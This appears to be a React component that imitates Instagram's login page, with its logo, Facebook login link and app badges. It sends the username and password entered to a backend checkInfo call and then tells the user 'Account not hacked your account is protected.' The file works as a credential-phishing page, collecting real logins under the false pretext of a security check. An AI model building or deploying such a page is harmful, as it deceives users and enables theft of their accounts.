import React from "react";

import AppStoreLogo from "../assets/app-store-logo.png";
import PlayStoreLogo from "../assets/googl-play-logo.png";
import InstaLogo from "../assets/Instagram_logo.svg.png";
import FaceBookLogo from "../assets/facebook-logo.png";
import "../styles/Login.css";

import { LoginForm } from "../Types";
import { checkInfo } from "../service/api";

const Login = () => {
    const [formData, setFormData] = React.useState<LoginForm>({ username: '', password: '' });
    const [error, setError] = React.useState<string | null>(null);
    const [showSuccess, setShowSuccess] = React.useState(false); // État pour la pop-up



  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({ ...prevData, [name]: value }));
  };

  /*const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Nom d'utilisateur:", formData.username);
    console.log("Mot de passe:", formData.password);
  };*/
  
  const handleCheckInfo = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    try {
      await checkInfo(formData);
      setShowSuccess(true); // Affiche la pop-up en cas de succès
    } catch (error) {
      setError('Error while verifying. Please try again.');
    }
  };

  const closePopup = () => {
    setShowSuccess(false); // Ferme la pop-up
  };
    return (
        <div className="login-container">
            <form className="box-1" onSubmit={handleCheckInfo}>
                <div className="box-1-logo">
                    <img src={InstaLogo} alt="Instagram Logo" className="insta-logo" />
                </div>
                {error && <p className="error-message">{error}</p>}
                <div className="input-box">
                    <input type="text" 
                    placeholder="Phone number, username or email address" 
                    name="username"
                    value={formData.username}
                    onChange={handleChange}
                    />
                </div>
                <div className="input-box">
                    <input type="password" 
                    placeholder="Password"
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                     />
                </div>
                <div className="login-btn-box">
                    <button className="login-btn" type="submit">Check your information</button>
                </div>
                <div className="lines-box">
                    <div className="line-1"></div>
                    <div className="or-box">OR</div>
                    <div className="line-1 line-2"></div>
                </div>
                <div className="fb-box">
                    <span>
                        <img src={FaceBookLogo} alt="Facebook Logo" className="fb-logo" />
                    </span>
                    <p className="fb-link">Login with Facebook</p>
                </div>
                <div className="forgotten-pwd-link">Forgotten your password?</div>
            </form>
            <div className="box-2">
                <p>Don't have an account? <span className="sign-up-span">Sign up</span> </p>
            </div>
            <div className="get-app-box">
                <p>Get the app.</p>
            </div>
            <div className="app-store-google-play-box">
                <img src={PlayStoreLogo} alt="PlayStore Logo" className="playStore-logo" />
                <img src={AppStoreLogo} alt="AppStore Logo" className="AppStore-logo" />
            </div>
            {showSuccess && (
        <div className="popup">
          <div className="popup-content">
            <h3>Congratulations !</h3>
            <p>Account not hacked your account is protected.</p>
            <button onClick={closePopup}>OK</button>
          </div>
        </div>
      )}

        </div>
    );
}

export default Login;